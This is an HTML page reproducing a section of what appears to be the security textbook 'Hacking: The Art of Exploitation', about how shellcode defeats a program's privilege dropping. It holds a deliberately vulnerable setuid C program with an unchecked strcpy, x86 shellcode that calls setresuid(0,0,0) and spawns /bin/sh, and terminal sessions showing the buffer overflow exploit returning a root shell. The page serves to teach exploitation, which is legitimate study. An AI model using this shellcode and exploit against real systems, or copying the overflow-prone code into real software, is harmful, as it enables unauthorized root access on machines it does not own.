<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x531 A Matter of Privilege</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part121.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part123.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: justify;"><a name="bookmark111">0x531 A Matter of Privilege</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">To help mitigate rampant privilege escalation, some privileged processes will lower their effective privileges while doing things that don’t require that kind of access. This can be done with the <span class="s31">seteuid() </span>function, which will set the effec- tive user ID. By changing the effective user ID, the privileges of the process can be changed. The manual page for the <span class="s31">seteuid() </span>function is shown below.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_907.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: justify;">SETEGID(2)         Linux Programmer&#39;s Manual         SETEGID(2)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">NAME</p><p class="s31" style="padding-left: 24pt;text-indent: 0pt;text-align: center;">seteuid, setegid - set effective user or group ID</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">SYNOPSIS</p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;line-height: 107%;text-align: left;">#include &lt;sys/types.h&gt; #include &lt;unistd.h&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;line-height: 107%;text-align: left;">int seteuid(uid_t euid); int setegid(gid_t egid);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">DESCRIPTION</p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;text-align: left;">seteuid() sets the effective user ID of the current process. Unprivileged user processes may only set the effective user ID to</p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;line-height: 107%;text-align: left;">ID to the real user ID, the effective user ID or the saved set-user-ID. Precisely the same holds for setegid() with &quot;group&quot; instead of &quot;user&quot;.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">RETURN VALUE</p><p class="s31" style="padding-bottom: 3pt;padding-left: 121pt;text-indent: 0pt;text-align: left;">On success, zero is returned. On error, -1 is returned, and errno is set appropriately.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_908.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This function is used by the following code to drop privileges down to those of the “games” user before the vulnerable <span class="s31">strcpy() </span>call.</p><p class="s40" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">drop_privs.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_909.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">#include &lt;unistd.h&gt;</p><p class="s31" style="padding-left: 104pt;text-indent: -12pt;line-height: 107%;text-align: left;">void lowered_privilege_function(unsigned char *ptr) { char buffer[50];</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">seteuid(5);  // Drop privileges to games user. strcpy(buffer, ptr);</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">}</p><p class="s31" style="padding-left: 104pt;text-indent: -12pt;line-height: 107%;text-align: left;">int main(int argc, char *argv[]) { if (argc &gt; 0)</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;text-align: left;">lowered_privilege_function(argv[1]);</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_910.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Even though this compiled program is setuid root, the privileges are dropped to the games user before the shellcode can execute. This only spawns a shell for the games user, without root access.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_911.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gcc -o drop_privs drop_privs.c</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ sudo chown root ./drop_privs; sudo chmod u+s ./drop_privs reader@hacking:~/booksrc $ export SHELLCODE=$(cat tiny_shell) reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./drop_privs</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">SHELLCODE will be at 0xbffff9cb</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./drop_privs $(perl -e &#39;print &quot;\xcb\xf9\xff\xbf&quot;x40&#39;) sh-3.2$ whoami</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">games</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">sh-3.2$ id</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">uid=999(reader) gid=999(reader) euid=5(games) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scan ner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(reader)</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">sh-3.2$</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_912.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Fortunately, the privileges can easily be restored at the beginning of our shellcode with a system call to set the privileges back to root. The most com- plete way to do this is with a <span class="s31">setresuid() </span>system call, which sets the real, effective, and saved user IDs. The system call number and manual page are shown below.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_913.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ grep -i setresuid /usr/include/asm-i386/unistd.h</p><p class="s46" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">#define <u>&nbsp;</u>NR_setresuid    164</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">#define <u>&nbsp;</u>NR_setresuid32    208</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ man 2 setresuid</p><p class="s31" style="padding-left: 23pt;text-indent: 0pt;text-align: left;">SETRESUID(2)        Linux Programmer&#39;s Manual       SETRESUID(2)</p><p class="s31" style="padding-top: 11pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">NAME</p><p class="s31" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">setresuid, setresgid - set real, effective and saved user or group ID</p><p class="s31" style="padding-top: 11pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">SYNOPSIS</p><p class="s31" style="padding-left: 49pt;text-indent: 0pt;line-height: 107%;text-align: left;">#define _GNU_SOURCE #include &lt;unistd.h&gt;</p><p class="s31" style="padding-top: 2pt;padding-left: 49pt;text-indent: 0pt;text-align: left;">int setresuid(uid_t ruid, uid_t euid, uid_t suid); int setresgid(gid_t rgid, gid_t egid, gid_t sgid);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">DESCRIPTION</p><p class="s31" style="padding-bottom: 3pt;padding-left: 49pt;text-indent: 0pt;text-align: left;">setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the current process.</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_914.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 110%;text-align: justify;">The following shellcode makes a call to <span class="s31">setresuid() </span>before spawning the shell to restore root privileges.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s40" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">priv_shell.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_915.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">BITS 32</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: -8pt;line-height: 107%;text-align: justify;">; setresuid(uid_t ruid, uid_t euid, uid_t suid); xor eax, eax   ; Zero out eax.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 106%;text-align: justify;">xor ebx, ebx   ; Zero out ebx. xor ecx, ecx   ; Zero out ecx. xor edx, edx   ; Zero out edx.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: justify;">mov al, 0xa4  ; 164 (0xa4) for syscall #164</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: justify;">int 0x80     ; setresuid(0, 0, 0) Restore all root privs.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: -8pt;line-height: 107%;text-align: left;">; execve(const char *filename, char *const argv [], char *const envp[]) xor eax, eax   ; Make sure eax is zeroed again.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov al, 11    ; syscall #11</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">push ecx     ; push some nulls for string termination. push 0x68732f2f  ; push &quot;//sh&quot; to the stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">push 0x6e69622f  ; push &quot;/bin&quot; to the stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov ebx, esp   ; Put the address of &quot;/bin//sh&quot; into ebx via esp. push ecx     ; push 32-bit null terminator to stack.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov edx, esp   ; This is an empty array for envp.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">push ebx      ; push string addr to stack above null terminator. mov ecx, esp    ; This is the argv array with string ptr.</p><p class="s31" style="padding-bottom: 3pt;padding-left: 99pt;text-indent: 0pt;line-height: 10pt;text-align: left;">int 0x80    ; execve(&quot;/bin//sh&quot;, [&quot;/bin//sh&quot;, NULL], [NULL])</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_916.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">This way, even if a program is running under lowered privileges when it’s exploited, the shellcode can restore the privileges. This effect is demonstrated below by exploiting the same program with dropped privileges.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_917.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ nasm priv_shell.s reader@hacking:~/booksrc $ export SHELLCODE=$(cat priv_shell) reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./drop_privs SHELLCODE will be at 0xbffff9bf</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./drop_privs $(perl -e &#39;print &quot;\xbf\xf9\xff\xbf&quot;x40&#39;) sh-3.2# whoami</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">root</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">sh-3.2# id</p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">uid=0(root) gid=999(reader) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scan ner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(reader)</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">sh-3.2#</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_918.png"/></span></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part121.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part123.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
